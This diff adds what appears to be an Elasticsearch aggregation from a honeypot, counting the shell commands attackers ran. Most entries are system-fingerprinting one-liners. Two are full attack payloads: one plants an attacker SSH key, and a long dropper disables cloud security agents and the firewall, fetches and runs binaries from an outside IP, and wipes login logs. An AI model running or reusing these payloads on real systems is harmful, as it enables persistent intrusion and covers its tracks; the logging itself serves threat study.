@@ -1,0 +1,66 @@
+{
+  "took": 3,
+  "timed_out": false,
+  "_shards": {
+    "total": 6,
+    "successful": 6,
+    "skipped": 0,
+    "failed": 0
+  },
+  "hits": {
+    "total": {
+      "value": 3375,
+      "relation": "eq"
+    },
+    "max_score": null,
+    "hits": []
+  },
+  "aggregations": {
+    "top_inputs": {
+      "doc_count_error_upper_bound": 0,
+      "sum_other_doc_count": 12,
+      "buckets": [
+        {
+          "key": "cat /proc/uptime 2 > /dev/null | cut -d. -f1",
+          "doc_count": 806
+        },
+        {
+          "key": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null); arch=$(uname -m 2>/dev/null); uptime=$(cat /proc/uptime 2>/dev/null | cut -d. -f1); cpus=$( (nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null) | head -1); cpu_model=$( (grep -m1 -E \"model name|Hardware\" /proc/cpuinfo | cut -d: -f2- | sed 's/^ *//;s/ *$//' ; lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +| +$/,\"\",$2); print $2; exit}' ; dmidecode -s processor-version 2>/dev/null | head -n1 ; uname -p 2>/dev/null) | awk 'NF{print; exit}' ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia) 2>/dev/null | head -n50); cat_help=$( (cat --help 2>&1 | tr '\\n' ' ') || cat --help 2>&1); ls_help=$( (ls --help 2>&1 | tr '\\n' ' ') || ls --help 2>&1); last_output=$(last 2>/dev/null | head -n 10); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"CAT_HELP:$cat_help\"; echo \"LS_HELP:$ls_help\"; echo \"LAST:$last_output\"",
+          "doc_count": 806
+        },
+        {
+          "key": "uname -m 2 > /dev/null",
+          "doc_count": 806
+        },
+        {
+          "key": "uname -s -v -n -m 2 > /dev/null",
+          "doc_count": 806
+        },
+        {
+          "key": "uname -s -v -n -r -m",
+          "doc_count": 81
+        },
+        {
+          "key": "/bin/./uname -s -v -n -r -m",
+          "doc_count": 51
+        },
+        {
+          "key": "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629\" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"",
+          "doc_count": 3
+        },
+        {
+          "key": "uname -s -m",
+          "doc_count": 2
+        },
+        {
+          "key": """#!/bin/sh; ; wdir="/tmp"; for i in "/tmp" "/var/tmp" "/dev/shm" "/usr" "/bin" "/home" "/root"; do;     if [ -w "$i" ]; then;         wdir="$i";         break;     fi; done; cd "$wdir" || exit 1; ; ; systemctl stop YDService >/dev/null 2>&1; systemctl disable YDService >/dev/null 2>&1; systemctl stop tat_agent >/dev/null 2>&1; systemctl disable tat_agent >/dev/null 2>&1; ; ; systemctl mask YDService >/dev/null 2>&1; systemctl mask tat_agent >/dev/null 2>&1; ; ; systemctl daemon-reload; ; ; if command -v chattr >/dev/null 2>&1; then;     chattr -R -i -a /usr/local/qcloud/ >/dev/null 2>&1; fi; ; ; pkill -9 YDService >/dev/null 2>&1; pkill -9 YDLive >/dev/null 2>&1; ; ; rm -rf /usr/local/qcloud/YunJing >/dev/null 2>&1; rm -rf /usr/local/qcloud/stargate >/dev/null 2>&1; rm -rf /usr/local/qcloud/monitor >/dev/null 2>&1; rm -rf /usr/local/qcloud/tat_agent >/dev/null 2>&1; ; mkdir -p /usr/local/qcloud/YunJing; mkdir -p /usr/local/qcloud/tat_agent; if command -v chattr >/dev/null 2>&1; then;     chattr +i /usr/local/qcloud/YunJing;     chattr +i /usr/local/qcloud/tat_agent; fi; ; ; ; disable_firewall() {;     systemctl stop firewalld ufw >/dev/null 2>&1;     systemctl disable firewalld ufw >/dev/null 2>&1;     service firewalld stop >/dev/null 2>&1;     service ufw stop >/dev/null 2>&1; ;     if command -v iptables >/dev/null 2>&1; then;         iptables -P INPUT ACCEPT >/dev/null 2>&1;         iptables -P FORWARD ACCEPT >/dev/null 2>&1;         iptables -P OUTPUT ACCEPT >/dev/null 2>&1;         iptables -F >/dev/null 2>&1;         iptables -X >/dev/null 2>&1;         iptables -t nat -F >/dev/null 2>&1;         iptables -t nat -X >/dev/null 2>&1;     fi; }; disable_firewall; ; download_and_run() {;     url="$1";     filename="$2";     ;     if [ -f "./$filename" ] && [ -x "./$filename" ]; then;         setsid "./$filename" >/dev/null 2>&1 &;         return 0;     fi; ;     dl_bin="";     dl_args=""; ;     if command -v good >/dev/null 2>&1; then;         dl_bin="good";         dl_args="--no-check-certificate -q $url -O $filename";     elif command -v cool >/dev/null 2>&1; then;         dl_bin="cool";         dl_args="-skL $url -o $filename";     elif command -v wget >/dev/null 2>&1; then;         dl_bin="wget";         dl_args="--no-check-certificate -q $url -O $filename";     elif command -v curl >/dev/null 2>&1; then;         dl_bin="curl";         dl_args="-skL $url -o $filename";     fi; ;     if [ -z "$dl_bin" ]; then;         apt-get update >/dev/null 2>&1 && apt-get install -y wget curl >/dev/null 2>&1;         yum install -y wget curl >/dev/null 2>&1;         if command -v wget >/dev/null 2>&1; then;             dl_bin="wget";             dl_args="--no-check-certificate -q $url -O $filename";         fi;     fi; ;     if [ -n "$dl_bin" ]; then;         $dl_bin $dl_args >/dev/null 2>&1;         if [ -f "$filename" ]; then;             chmod +x "$filename";             setsid "./$filename" >/dev/null 2>&1 &;         fi;     fi; }; ; lock_tools() {;     command -v chattr >/dev/null 2>&1 && chattr -i /usr/bin/wget /usr/bin/curl >/dev/null 2>&1; ;     w_path=$(which wget 2>/dev/null);     if [ -n "$w_path" ]; then;         case "$w_path" in;             *good*) ;;;             *) mv "$w_path" "$(dirname "$w_path")/good" >/dev/null 2>&1 ;;;         esac;     fi; ;     c_path=$(which curl 2>/dev/null);     if [ -n "$c_path" ]; then;         case "$c_path" in;             *cool*) ;;;             *) mv "$c_path" "$(dirname "$c_path")/cool" >/dev/null 2>&1 ;;;         esac;     fi; }; ; SERVER_IP="23.160.56.119"; download_and_run "http://$SERVER_IP/vos.txt" "system_update"; download_and_run "http://$SERVER_IP/vox.txt" "network_conf"; ; lock_tools; ; cleanup() {;     for log in /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/syslog /var/log/auth.log; do;         if [ -f "$log" ]; then;             echo > "$log" 2>/dev/null;         fi;     done;     rm -f "$0"; }; cleanup; ; rm -- "$0"; rm -f /root/vos.sh; rm -f /tmp.vos.sh; exit 0""",
+          "doc_count": 1
+        },
+        {
+          "key": "/bin/skhqwensw",
+          "doc_count": 1
+        }
+      ]
+    }
+  }
+}
